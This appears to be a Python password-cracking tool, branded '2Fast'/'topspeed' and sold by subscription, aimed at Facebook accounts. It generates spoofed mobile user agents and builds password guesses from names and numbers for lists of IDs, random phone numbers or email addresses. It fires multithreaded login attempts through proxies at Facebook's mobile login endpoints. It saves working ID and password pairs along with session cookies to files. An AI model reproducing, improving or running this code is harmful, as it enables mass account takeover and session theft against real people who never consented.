	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakurra=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakurra)
for ui in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    

for agenku in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2006C3MII'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh1=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh1)
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh3=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh3)

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['801SO'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/63.0.2254.62069'
  uakuh3=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh3)
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='SM-G960N Build/QP1A.190711.020; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh4=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh4)

  aa='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['SM-J610F'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(80,106)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh5=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh5)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['LE2113'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh6=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh6)

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['6','7','8','9','10','11','12'])
  c=(['en-us; RMX1925 Build/QKQ1.200209.002)'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(73,100)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
  uakuh7=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
  ugen.append(uakuh7)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2012K11C'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/51.4.5237.26623'
  uakuh8=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh8)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['vivo 1002T'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh9=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh9)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['CPH2083'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 GoogleApp/13.44.10.26.arm64'
  uakuh10=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh10)
  
  ######[PLAY_AUDIO]#####
def play_audio(audio_file):
    from os import system as cmd
    try:
        cmd("play-audio "+audio_file)
    except:
        pass
  
#os.system('xdg-open https://www.facebook.com/ITX.AK.topspeed')
logo = ("""
\x1b[38;5;196m=====================>>> \x1b[38;5;46mWELCOME \x1b[38;5;196m<<<==========================
\x1b[38;5;46m ╔═══════════════════════════════════════════════════════════╗
\x1b[38;5;46m║\x1b[38;5;198m ██████╗ ███████╗ █████╗ ███████╗████████╗ ██████╗ ██████╗ \x1b[38;5;46m║
\x1b[38;5;46m║ \x1b[38;5;46m╚════██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗\x1b[38;5;46m║
\x1b[38;5;46m║  \x1b[38;5;220m█████╔╝█████╗  ███████║███████╗   ██║   ██║   ██║██████╔╝\x1b[38;5;46m║
\x1b[38;5;46m║ \x1b[38;5;33m██╔═══╝ ██╔══╝  ██╔══██║╚════██║   ██║   ██║   ██║██╔═══╝ \x1b[38;5;46m║
\x1b[38;5;46m║ \x1b[38;5;196m███████╗██║     ██║  ██║███████║   ██║   ╚██████╔╝██║     \x1b[38;5;46m║
\x1b[38;5;46m║ \x1b[38;5;198m╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     \x1b[38;5;46m║
\x1b[38;5;46m ╚═══════════════════════════════════════════════════════════╝
\x1b[38;5;196m===================>>>\x1b[38;5;46mMining System\x1b[38;5;196m<<<=========================

\x1b[38;5;81m┏━━━━━━━━━━━┃━A━┃━B━┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\x1b[38;5;81m┃\x1b[38;5;206m┏━━━━━━━━━┃━C━┃━D━┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓  \x1b[38;5;81m1┃
\x1b[38;5;81m┃\x1b[38;5;206m┃\x1b[38;5;63m┏━━━━━━━┃━E━┃━F━┃━━━━━━━━━━━━━━━━━━━━━━━━━━┓  \x1b[38;5;206mH┃  \x1b[38;5;81m2┃
\x1b[38;5;81m┃\x1b[38;5;206m┃\x1b[38;5;63m┃\x1b[38;5;231m     [✓] AUTHOR    : 2Fast Hacker        \x1b[38;5;63mA┃  \x1b[38;5;206mI┃  \x1b[38;5;81m3┃
\x1b[38;5;81m┃\x1b[38;5;206m┃\x1b[38;5;63m┃\x1b[38;5;231m     [✓] VERSION   : 0.0.1               \x1b[38;5;63mB┃  \x1b[38;5;206mJ┃  \x1b[38;5;81m4┃
\x1b[38;5;81m┃\x1b[38;5;206m┃\x1b[38;5;63m┃\x1b[38;5;231m     [✓] STATUS    : Active              \x1b[38;5;63mC┃  \x1b[38;5;206mK┃  \x1b[38;5;81m5┃
\x1b[38;5;81m┃\x1b[38;5;206m┃\x1b[38;5;63m┃\x1b[38;5;231m     [✓] SYSTEM    : DATA & WIFI         \x1b[38;5;63mD┃  \x1b[38;5;206mL┃  \x1b[38;5;81m6┃
\x1b[38;5;81m┃\x1b[38;5;206m┃\x1b[38;5;63m┃\x1b[38;5;231m     [✓] VISIT     : 2fast.top           \x1b[38;5;63mE┃  \x1b[38;5;206mM┃  \x1b[38;5;81m7┃
\x1b[38;5;81m┃\x1b[38;5;206m┃\x1b[38;5;63m┃\x1b[38;5;231m     [✓] ADMIN     : ONLINE😍            \x1b[38;5;63mF┃  \x1b[38;5;206mN┃  \x1b[38;5;81m8┃
\x1b[38;5;81m┃\x1b[38;5;206m┃\x1b[38;5;63m┃\x1b[38;5;231m     [✓] SUPPORT   : support@2fast.top   \x1b[38;5;63mG┃  \x1b[38;5;206mP┃  \x1b[38;5;81m9┃
\x1b[38;5;81m┃\x1b[38;5;206m┃\x1b[38;5;63m┗━━━━━━━━━━━━━━━━━━━━━━━━━━┃━1━┃━2━┃━━━━━━━┛  \x1b[38;5;206mQ┃  \x1b[38;5;81mA┃
\x1b[38;5;81m┃\x1b[38;5;206m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┃━3━┃━4━┃━━━━━━━━━━┛  \x1b[38;5;81mB┃
\x1b[38;5;81m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┃━5━┃━6━┃━━━━━━━━━━━━━┛
 """)
os.system('espeak -a 300 " Whats,Your,Name,Sir"')
print(logo)
print(f'\033[1;92m[\033[1;31m●\033[1;92m]\033[0;92m WHAT IS YOUR NAME')
topspeed_NAME=input(f'\033[1;92m[\033[1;31m●\033[1;92m]\033[0;92m YOUR NAME :\x1b[1;96m ')

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        os.system('espeak -a 300 " 1, Choose,your,system"')
        print("\033[1;32m ═════════════════════════════════════════")
        print(" \33[1;96m[01]\33[1;96m FILE CRACK")
        print("\33[1;96m [02]\33[1;96m RANDOM FACEBOOK ID")
        print("\33[1;96m [03]\33[1;96m RANDOM EMAIL")
        print(" \33[1;96m[04]\33[1;96m SMS BOMBING (soon)]")
        print("\33[1;96m [05]\33[1;96m PYTHON TO ENC (COMING SOON)]")
        print("\33[1;96m [06]\33[1;96m Go on 2FAST WEBSITE")
        print(" [00] Exit")
        print("\033[1;32m ═════════════════════════════════════════")
        topspeed =input(" [?] Choose : ")
        
        if topspeed in ["1", "01"]:
            C1()
        if topspeed in ["2","02"]:
            num()
        if topspeed in ["3","03"]:
            gml()
        if topspeed in ["6","06"]:
            os.system("xdg-open https://2fast.top")
        if topspeed in [" 0", "00"]:
            exit()
        else:
            exit()
            
def C1():
	
	os.system('espeak -a 300 " your file name"')
	print('\033[1;32m[💖]EXAMPLE : /sdcard/nesha.txt')
	o = input('\x1b[1;97m [💖] INPUT FILE PATH: ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
    #print(logo)
	print('\x1b[1;92m METHOD 1\n\x1b[1;97m [1] METHOD 1 ')
	os.system('espeak -a 300 " 1,  method,  one"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['9','09']:
		method.append('mbasic')
	else:
		method.append('mobile')
	passwrd()
	exit()

def passwrd():
	os.system('clear')
	print(logo)
	print(f"\033[1;92m[\033[1;92m\033[1;31m✓\033[1;92m] 𝑼𝑺𝑬𝑹 𝑵𝑨𝑴𝑬     \033[1;34m: \033[0;92m"+str(topspeed_NAME))
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTHIS TOOL IS FOR HATERS")
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOOL MADE BY topspeed")
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mIF NO ID THEN ON/OFF AROPLANE MODE")
	print("\033[97;1m════════════════════════════════════╗")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					pwv.append(frs+'#@')
					pwv.append(frs+'gamer')
					pwv.append(frs+'999')
					pwv.append(frs+'1234'+frs)
					
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					
					
					
				pool.submit(crack,idf,pwv)
	print('')
	topspeedj('═══════════════════════════════════╗')
	topspeedj('CRACK ENDED .......... ')
	print(f'{h}[{h}💚{h}]{h} TOTAL OKS : {h}%s '%(ok))
	input('CLICK ENTER TO EXIT ')
	#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo}[topspeed] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#topspeed-Nola
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•topspeed-Cp] {idf} • {pw}')     
				os.system('espeak -a 300 " C,  P"')
			    #open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#topspeed-Nola
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•topspeed-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m══════════════════════════════════════════════╗')
				os.system('espeak -a 300 " SIR,  Ok,  id"')
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def num():
    user=[]
    os.system('clear')
    print(logo)
    print(' [★] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [★] EXAMPLE : 3000, 5000, 10000, 50000 ')
   
    limit = int(input(' [?] Crack Your Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f"\033[1;92m[\033[1;92m\033[1;31m✓\033[1;92m] 𝑼𝑺𝑬𝑹 𝑵𝑨𝑴𝑬     \033[1;34m: \033[0;92m"+str(topspeed_NAME))
        print(' \033[38;5;46m[★] 𝑻𝑶𝑻𝑨𝑳 𝑻𝑨𝑹𝑮𝑬𝑻 𝑰𝑫𝒁:\033[1;92m '+tl)
        print("\033[1;32m ═══════════════════════════════════════════╗")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [★] Crack process has been completed')
    print(' [★] Ids saved in topspeed-ok.txt,topspeed-cp.txt')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    os.system('espeak -a 300 "Type,terget,fast,name"')
    kode = input(' [★] FAST NAME : ')
    os.system('clear')
    print(logo)
    os.system('espeak -a 300 "type,terget,last,name"')
    kodex = input(' [★] LAST NAME :  ')
    os.system('clear')
    print(logo) 
    os.system('espeak -a 300 "choose,gmail,or,yahoo"')
    print(' [★] EXAMPLE : @gmail.com, @yahoo.com ')
   
    doamin = input(' [?] Choose doamin : ')
    os.system('clear')
    print(logo)
    os.system('espeak -a 300 "type,how many,ids,you,need"')
    print(' [★] EXAMPLE : 3000, 5000, 10000, 50000 ')
    
    limit = int(input('[?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f"\033[1;92m[\033[1;92m\033[1;31m✓\033[1;92m] 𝑼𝑺𝑬𝑹 𝑵𝑨𝑴𝑬     \033[1;34m: \033[0;92m"+str(topspeed_NAME))
        print(' \033[38;5;46m[★] 𝑻𝑶𝑻𝑨𝑳 𝑻𝑨𝑹𝑮𝑬𝑻 𝑰𝑫𝒁:\033[1;92m '+tl)
        print("\033[1;32m ═══════════════════════════════════════════╗")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [★] Crack process has been completed')
    print(' [★] Ids saved in topspeed-ok.txt,topspeed-cp.txt')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92m[topspeed]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
  #-----------------------[ Update-Script]--------------------#
            header_freefb = {'authority': 'p.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"8.1.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro }
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[topspeed-𝑶𝑲💚] {uid} | {ps}")
                os.system('espeak -a 300 " 1,  Yo,baby,you,have,a,ok,id"')
                print(f" \33[1;96m Cookie🤤: {coki}")
                open('/sdcard/topspeed-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[topspeed-𝑪𝑷💔] {uid}|{ps}")
                os.system('espeak -a 300 " 1, Ai,da,kono,kotha,baby"')
                open('/sdcard/topspeed-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[topspeed] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
        
#-----------------------[ SYSTEM-CONTROL ]--------------------#
def approved():
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "9".join(uuid)
    e=requests.get("https://github.com/2FastTop/Key/blob/fdb03177a8d531320019a1d935e8d3e27a692d17/api.txt").text
    if id in e:
        Main()
    else:
        clear()

        print(" This is a paid system")
        print(" FOR USING THIS SYSTEM YOU MUST GET A SUBSCRIPTION")
        print("For Buy A subscription we redirect you in our web site")
        print(" ══════════════════════════════════════")
        print(" ══════════════════════════════════════")
        os.system('espeak -a 300 " This,is,a,paid,system,FOR,USING,THIS,SYSTEM,YOU,MUST,Have,A,SUBSCRIPTION,Pack,For,Buy,A,subscription,Pack,We,redirect,you,in,our,web,site"')  
